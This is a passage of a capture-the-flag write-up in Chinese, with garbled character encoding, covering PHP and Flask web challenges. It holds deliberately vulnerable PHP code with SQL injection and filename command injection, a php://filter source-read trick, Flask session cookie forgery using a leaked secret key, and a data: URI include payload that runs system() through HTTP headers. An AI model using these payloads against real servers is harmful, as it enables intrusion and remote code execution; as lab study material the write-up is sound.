    $uri = parse_url($_SERVER["REQUEST_URI"]);
    parse_str($uri['query'], $query);
//    var_dump($query);
//    die();
    foreach($keywords as $token)
    {
        foreach($query as $k => $v)
        {
            if (stristr($k, $token))
                hacker();
            if (stristr($v, $token))
                hacker();
        }
    }
}

function Filter($string)
{
    global $mysqli;
    $blacklist = "information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password";
    $whitelist = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'(),_*`-@=+><";
    for ($i = 0; $i < strlen($string); $i++) {
        if (strpos("$whitelist", $string[$i]) === false) {
            Hacker();
        }
    }
    if (preg_match("/$blacklist/is", $string)) {
        Hacker();
    }
    if (is_string($string)) {
        return $mysqli->real_escape_string($string);
    } else {
        return "";
    }
}

function sql_query($sql_query)
{
    global $mysqli;
    $res = $mysqli->query($sql_query);
    return $res;
}

function login($user, $pass)
{
    $user = Filter($user);
    $pass = md5($pass);
    $sql = "select * from `albert_users` where `username_which_you_do_not_know`= '$user' and `password_which_you_do_not_know_too` = '$pass'";
    echo $sql;
    $res = sql_query($sql);
//    var_dump($res);
//    die();
    if ($res->num_rows) {
        $data = $res->fetch_array();
        $_SESSION['user'] = $data[username_which_you_do_not_know];
        $_SESSION['login'] = 1;
        $_SESSION['isadmin'] = $data[isadmin_which_you_do_not_know_too_too];
        return true;
    } else {
        return false;
    }
    return;
}

function updateadmin($level,$user)
{
    $sql = "update `albert_users` set `isadmin_which_you_do_not_know_too_too` = '$level' where `username_which_you_do_not_know`='$user' ";
    echo $sql;
    $res = sql_query($sql);
//    var_dump($res);
//    die();
//    die($res);
    if ($res == 1) {
        return true;
    } else {
        return false;
    }
    return;
}

function register($user, $pass)
{
    global $mysqli;
    $user = Filter($user);
    $pass = md5($pass);
    $sql = "insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES ('$user','$pass','0')";
    $res = sql_query($sql);
    return $mysqli->insert_id;
}

function logout()
{
    session_destroy();
    Header("Location: index.php");
}
?>
```

è¯»ffffllllaaaagggæŠ¥é”™

![image-20220108220633961](README/image-20220108220633961.png)

```php
    $keywords = ["flag","manage","ffffllllaaaaggg","info"];
    $uri = parse_url($_SERVER["REQUEST_URI"]);
    parse_str($uri['query'], $query);
```

è¿™é‡Œï¼Œparse_urlè§£ææ¼æ´

è¿™æ ·`//user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg`

```php
<?php
if (FLAG_SIG != 1){
    die("you can not visit it directly");
}else {
    echo "you can find sth in m4aaannngggeee";
}
?>
```

æç¤ºï¼š

```php
<?php
if (FLAG_SIG != 1){
    die("you can not visit it directly");
}
include "templates/upload.html";

?>
```

ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œè¯»`upllloadddd.php`

```php
<?php
$allowtype = array("gif","png","jpg");
$size = 10000000;
$path = "./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/";
$filename = $_FILES['file']['name'];
if(is_uploaded_file($_FILES['file']['tmp_name'])){
    if(!move_uploaded_file($_FILES['file']['tmp_name'],$path.$filename)){
        die("error:can not move");
    }
}else{
    die("error:not an upload fileÃ¯Â¼Â");
}
$newfile = $path.$filename;
echo "file upload success<br />";
echo $filename;
$picdata = system("cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/".$filename." | base64 -w 0");
echo "<img src='data:image/png;base64,".$picdata."'></img>";
if($_FILES['file']['error']>0){
    unlink($newfile);
    die("Upload file error: ");
}
$ext = array_pop(explode(".",$_FILES['file']['name']));
if(!in_array($ext,$allowtype)){
    unlink($newfile);
}
?>
```

æ–‡ä»¶åçš„ä»£ç æ‰§è¡Œæ¼æ´

/user.php?page=m4aaannngggeee ï¼Œä¸Šä¼ 

![image-20220108221431209](README/image-20220108221431209.png)

![image-20220108221704546](README/image-20220108221704546.png)



### [PASECA2019] honey_shop

sessionåº”è¯¥æ˜¯flaskï¼Œè¯»ä¸‹

![image-20220108224539091](README/image-20220108224539091.png)

è¯»/proc/self/environï¼Œ`çºªå½•å½“å‰è¿›ç¨‹(ä¹Ÿå°±æ˜¯python)çš„ç¯å¢ƒå˜é‡`ï¼Œæ‹¿åˆ°ç§˜é’¥

![image-20220108224720772](README/image-20220108224720772.png)

è§£å¯†ï¼š

```sh
flask-session-cookie-manager> python .\flask_session_cookie_manager3.py decode -s "tyQ0KBJ0RLDuomGI7GFe1KJDtvfymdE9cHzAuMx5" -c "eyJiYWxhbmNlIjoxMzM2LCJwdXJjaGFzZXMiOltdfQ.YdmjWw.G70lE_ZXpCiNMCOpwzfOMyUpLi0" 
{'balance': 1336, 'purchases': []}
```



```sh
flask-session-cookie-manager> python .\flask_session_cookie_manager3.py encode -s "tyQ0KBJ0RLDuomGI7GFe1K> python .\flask_session_cookie_manager3.py encode -s "tyQ0KBJ0RLDuomGI7GFe1KJDtvfymdE9cHzAuMx5" -t "{'balance': 1337, 'purchases': []}"
eyJiYWxhbmNlIjoxMzM3LCJwdXJjaGFzZXMiOltdfQ.YdmlCg.oYdIHfCg-zu28UkP-KhxNQ9fC4k
```

![image-20220108225416724](README/image-20220108225416724.png)

### Phuck2

buuæ‰“å¼€æ²¡æç¤ºï¼Œä»¥ä¸ºæ˜¯ç¯å¢ƒçš„é—®é¢˜ï¼Œåé¢è¦åŠ ä¸Š?hlï¼Œåº”è¯¥æ˜¯åŸé¢˜æœ‰æç¤º

```php
<?php
    stream_wrapper_unregister('php');
    if(isset($_GET['hl'])) highlight_file(__FILE__);

    $mkdir = function($dir) {
        system('mkdir -- '.escapeshellarg($dir));
    };
    $randFolder = bin2hex(random_bytes(16));
    $mkdir('users/'.$randFolder);
    chdir('users/'.$randFolder);

    $userFolder = (isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']);
    $userFolder = basename(str_replace(['.','-'],['',''],$userFolder));

    $mkdir($userFolder);
    chdir($userFolder);
    file_put_contents('profile',print_r($_SERVER,true));
    chdir('..');
    $_GET['page']=str_replace('.','',$_GET['page']);
    if(!stripos(file_get_contents($_GET['page']),'<?') && !stripos(file_get_contents($_GET['page']),'php')) {
        include($_GET['page']);
    }

    chdir(__DIR__);
    system('rm -rf users/'.$randFolder);

?>
```

é¦–å…ˆåœ¨usersç›®å½•ä¸‹éšæœºåˆ›å»ºäº†ä¸ªæ–‡ä»¶å¤¹ï¼Œä¹‹åè¿›å…¥è¯¥æ–‡ä»¶å¤¹ã€‚

åˆ¤æ–­æ˜¯å¦è®¾ç½®HTTP_X_FORWARDED_FORï¼Œå¦è€…ä½¿ç”¨REMOTE_ADDRï¼Œä¹‹åå°†\$userFolderä¸­çš„.å’Œ-å»é™¤ï¼Œä¹‹åè¿›å…¥\$userFolderçš„ç›®å½•ã€‚

å°†\$serverçš„ä¸€äº›ç¯å¢ƒå˜é‡ä¿¡æ¯å†™å…¥profileï¼Œè¿”å›ä¸Šçº§ç›®å½•ã€‚

å»é™¤pageçš„.å’Œ<?å’Œphpï¼Œä¹‹åå †pageè¿›è¡ŒåŒ…å«ï¼Œä¹‹ååˆ åº“è·‘è·¯ã€‚

å¯ä»¥æœ¬åœ°æµ‹è¯•ä¸‹ï¼š

```php
<?php
highlight_file(__FILE__);
chdir('./');
file_put_contents('profile.txt',print_r($_SERVER,true));
include("./profile.txt");
```

è€ƒç‚¹çš„å†…å®¹ï¼š

include ä¸ file_get_contents åœ¨å…³äº Data URI å¤„ç†é—®é¢˜ä¸Šçš„é—®é¢˜ï¼Œinclude () ä¸ file_get_contents () æ”¯æŒData URIï¼Œè€Œä¸”åœ¨å¤„ç†çš„æ—¶å€™ï¼Œå‡ºç°äº†å·®å¼‚.

å…ˆçœ‹`file_get_contents`ï¼šç›´æ¥è¿”å›`data:,`ä¹‹åçš„å†…å®¹

```php
<?php
print(file_get_contents("data:,123/profile"));
print("\n");
print(file_get_contents("data:,profile"));
print("\n");
#out:
#123/profile profile
```

è€Œåœ¨` allow_url_include=Off` çš„æƒ…å†µä¸‹ï¼Œä¸å…è®¸ include data URI çš„ï¼Œä½†æ˜¯å¦‚æœ `data:,XXX` æ˜¯ä¸€ä¸ªç›®å½•åçš„è¯ï¼Œå¯ä»¥ç»•è¿‡é™åˆ¶ï¼ŒåŒ…å«åˆ°`/`åè¾¹çš„æ–‡ä»¶:

```php
<?php	
print(include("data:,123/profile"));
print("\n");
print(include("data:,profile"));
print("\n");
```

---------

å½“allow_url_include=Offæ—¶ï¼š
file_get_contentsåœ¨å¤„ç†data:xxxæ—¶ä¼šç›´æ¥å–xxx
è€Œincludeä¼šåŒ…å«æ–‡ä»¶åä¸ºdata:xxxçš„æ–‡ä»¶

```php
file_get_contents('data:,xx/profile');   --> string 'xx/profile'
include('data:,xx/profile');             --> 'data:,xx/profile'
```

---------

includeçš„æ—¶å€™å¯ä»¥è§£æphpè¯­å¥ï¼Œ

payload:

```php
GET /?page=data:,aa/profile HTTP/1.1
X-Forwarded-For: data:,aa  #åˆ›å»ºåå­—ä¸ºdata:,xxçš„æ–‡ä»¶å¤¹
ss: <?php system('ls /'); ?>
    
GET /?page=data:,aa/profile HTTP/1.1
X-Forwarded-For: data:,aa
ss: <?php system('/get_flag'); ?>
    
å®é™…ä¸Šfile_get_contents('xx/profile') ä¸å­˜åœ¨xxæ–‡ä»¶å¤¹ï¼Œç»“æœä¸ºfalseç»•è¿‡ifåˆ¤æ–­
ç„¶åinclude(data:,xx/profile),é‡Œé¢æ˜¯$_SERVERçš„å†…å®¹ï¼Œå…¶ä¸­åŒ…å«phpè¯­å¥æ‰§è¡Œçš„ç»“æœ


```

```
Array
(
    [HTTP_X_FORWARDED_FOR] => data:aa
    [HTTP_SS] => flag{5acc61fc-d4f7-4748-97e0-b655e4e8fb01}
    [HTTP_HOST] => node4.buuoj.cn:28170
    [HTTP_USER_AGENT] => Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
    [HTTP_ACCEPT] => text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    [HTTP_ACCEPT_LANGUAGE] => zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    [HTTP_ACCEPT_ENCODING] => gzip, deflate
    [HTTP_CONNECTION] => close
    [HTTP_UPGRADE_INSECURE_REQUESTS] => 1
    [HTTP_CACHE_CONTROL] => max-age=0
    [PATH] => /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
    [SERVER_SIGNATURE] => <address>Apache/2.4.18 (Ubuntu) Server at node4.buuoj.cn Port 28170</address>

    [SERVER_SOFTWARE] => Apache/2.4.18 (Ubuntu)
    [SERVER_NAME] => node4.buuoj.cn
    [SERVER_ADDR] => 10.244.80.124
    [SERVER_PORT] => 28170
    [REMOTE_ADDR] => 10.244.80.46
    [DOCUMENT_ROOT] => /var/www/html
    [REQUEST_SCHEME] => http
    [CONTEXT_PREFIX] => 
    [CONTEXT_DOCUMENT_ROOT] => /var/www/html
    [SERVER_ADMIN] => webmaster@localhost
    [SCRIPT_FILENAME] => /var/www/html/index.php
    [REMOTE_PORT] => 46206
    [GATEWAY_INTERFACE] => CGI/1.1
    [SERVER_PROTOCOL] => HTTP/1.1
    [REQUEST_METHOD] => GET
    [QUERY_STRING] => page=data:aa/profile
    [REQUEST_URI] => /?page=data:aa/profile
    [SCRIPT_NAME] => /index.php
    [PHP_SELF] => /index.php
    [REQUEST_TIME_FLOAT] => 1641744281.579
    [REQUEST_TIME] => 1641744281
)

```





### [ç½‘é¼æ¯ 2020 æ€»å†³èµ›]Game Exp
